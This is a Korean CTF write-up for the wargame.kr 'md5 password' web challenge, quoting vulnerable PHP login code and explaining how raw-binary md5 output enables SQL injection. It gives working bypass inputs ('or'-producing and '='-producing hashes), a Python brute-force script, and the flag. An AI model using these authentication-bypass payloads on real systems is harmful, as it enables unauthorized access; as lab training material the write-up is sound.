---
layout: post
title: md5 password
source: "wargame.kr"
category: Web
rpath: /resource/md5_password
tag: [md5, sql_injection] 
---

**Category:** Web

**Source:** wargame.kr

**Points:** 216

**Author:** Jisoon Park(js00n.park)

**Description:** 

> md5('value', true);

## Write-up

password를 찾는 문제이다. 주어진 소스를 먼저 분석해본다.

```php
<?php
 if (isset($_GET['view-source'])) {
  show_source(__FILE__);
  exit();
 }

 if(isset($_POST['ps'])){
  sleep(1);
  mysql_connect("localhost","md5_password","md5_password_pz");
  mysql_select_db("md5_password");
  mysql_query("set names utf8");
  /*
  
  create table admin_password(
   password char(64) unique
  );
  
  */

  include "../lib.php"; // include for auth_code function.
  $key=auth_code("md5 password");
  $ps = mysql_real_escape_string($_POST['ps']);
  $row=@mysql_fetch_array(mysql_query("select * from admin_password where password='".md5($ps,true)."'"));
  if(isset($row[0])){
   echo "hello admin!"."<br />";
   echo "Password : ".$key;
  }else{
   echo "wrong..";
  }
 }
?>
<style>
 input[type=text] {width:200px;}
</style>
<br />
<br />
<form method="post" action="./index.php">
password : <input type="text" name="ps" /><input type="submit" value="login" />
</form>
<div><a href='?view-source'>get source</a></div>
```

전송한 password를 바로 사용하지 않고, md5한 값을 사용하도록 되어 있다.

문제 설명에도 나와있지만, php에서 md5(str, true) 처럼 두번째 인자로 true를 주는게 어떤 의미인가 싶어서 찾아봤더니 digest를 문자열로 주는게 아니라 binary로 돌려주는 옵션이었다.

md5를 적용했을 때 적당한 SQLi 공격 문자열이 생성되는 입력을 찾으면 될것 같다.

여러 입력을 생각해 볼 수 있는데, 일단은 일반적인 **(문자열)'or'(문자열)** 형태를 출력하는 입력을 만들어 보자.

google에 md5 sql injection으로 검색해보면, **129581926211651571912466741651878684928**이란 값을 찾을 수 있다. 이 값을 md5 hash하여 raw byte를 출력해보면 **ٔ0Do#ࠁ'or'8**라는 문자열이 나온다. 

'8'은 True로 해석되므로, 129581926211651571912466741651878684928를 입력하면 곧바로 문제를 해결할 수 있다.

또다른 방법은 =을 두번 사용하도록 하는 것이다. 예를 들어, sql query의 where 절에 **password='abc'='def'**라는 조건이 오면, password='abc' 부분은 false로, 'def'도 false로 해석되어 false=false가 되어 최종적으로는 true가 된다고 한다.

(참고로, mysql query에서, "1"은 True, "a"는 False이다.)

간단하게, **'='** 라는 문자열이 포함된 hash를 만들어내는 입력을 찾아보자.

```python
import md5

i = 0
while True:
  m = md5.new()
  m.update(str(i))
  if "'='" in m.digest():
    print str(i)
    break
  i = i + 1
```

**1839431**이라는 값을 금방 찾을 수 있고, 이를 입력하면 key를 얻을 수 있다.

![img]({{page.rpath|prepend:site.baseurl}}/flag.png)

Flag : **5e49a3fa8ec013bc0acc7393c1301ff87b749565**
